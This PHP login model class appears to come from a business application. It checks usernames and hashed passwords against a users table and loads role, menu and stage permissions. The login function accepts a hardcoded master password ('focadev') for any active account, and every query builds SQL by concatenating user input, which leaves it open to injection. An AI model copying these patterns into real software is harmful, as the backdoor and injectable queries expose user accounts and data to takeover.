<?php
class login_model extends main_model{
    
    function send_login($user, $pass){
        //$pass;
        //crypt($pass, $passwordenBD)
        $this->_db->select("ID,CLAVE,USERNAME,NOMBRE,APELLIDO,ID_ROL,ID_PUESTO,ID_AREA,SU_1,SU_2,SU_3,SU_4,SU_5,SU_6");
        $this->_db->where("USERNAME = '".$user."' AND ESTADO = 1");
        $rtn = $this->_db->get_tabla("fid_usuarios");
                
        if ($rtn){
            if ($pass=='focadev'){
                return $rtn;
            }else{
                $passwordenBD = trim($rtn[0]['CLAVE']);
                if( crypt($pass, $passwordenBD) == $passwordenBD) {  
                    return $rtn; 
                } 
            }
        }
        return false;
    }
    
    function get_permisos( $id_user ){
        //obtener rol
        $user =  $this->_db->get_tabla("fid_usuarios","ID='".$id_user."' AND ESTADO = 1");
        if ($user){
            $rol = $user[0]['ID_ROL'];
            //obtener roles_permisos
            $roles_permisos = $this->_db->get_tabla("fid_roles_permisos","ID_ROL='".$rol."'");
            //log_this('aaaaaaaa.log', $this->_db->last_query() );
            
            if ($roles_permisos){
                return $roles_permisos;
            }
        }
        return false; 
    }
    
    function get_permisos_menu( $id_user ){
        //obtener rol
        $user =  $this->_db->get_tabla("fid_usuarios","ID='".$id_user."' AND ESTADO = 1");
        if ($user){
            $rol = $user[0]['ID_ROL'];
            //obtener roles_menu
            $roles_menu =  $this->_db->get_tabla("fid_roles_menu","ID_ROL='".$rol."'");
            if ($roles_menu){
                return $roles_menu;
            }
        }
        return false; 
    }
    
    function get_permisos_etapas( $id_user ){
        //obtener rol
        $user =  $this->_db->get_tabla("fid_usuarios","ID='".$id_user."' AND ESTADO = 1");
        if ($user){
            $rol = $user[0]['ID_ROL'];
            //obtener roles_menu
            $roles_etapas =  $this->_db->get_tabla("fid_roles_etapas","ID_ROL='".$rol."'");
            if ($roles_etapas){
                return $roles_etapas;
            }
        }
        return false; 
    }
    
    
}

?>
